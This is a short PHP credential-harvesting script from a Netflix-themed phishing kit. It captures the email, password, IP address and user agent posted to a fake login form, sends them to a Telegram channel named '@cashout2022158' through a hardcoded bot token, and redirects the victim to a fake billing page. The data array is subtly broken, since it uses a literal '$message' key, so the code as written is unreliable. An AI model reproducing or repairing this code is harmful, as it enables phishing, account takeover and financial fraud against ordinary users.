<?php
header('Location: /netflix/billing_info');
$Agent=$_SERVER['HTTP_USER_AGENT'];
$Ip=$_SERVER['REMOTE_ADDR'];
$email=$_POST['email'];
$password=$_POST['password'];
$nl="\r\n";
$message = 'EMAIL: ' . $email . $nl.'PASSWORD: ' . $password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
$apiToken = "5369209739:AAFaMNk39MGepMZ3E9YrjLqhEHZupqCK-Pw";

$data = [
    'chat_id' => '@cashout2022158',
    '$message' => '$message'
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
// Do what you want with result
?>
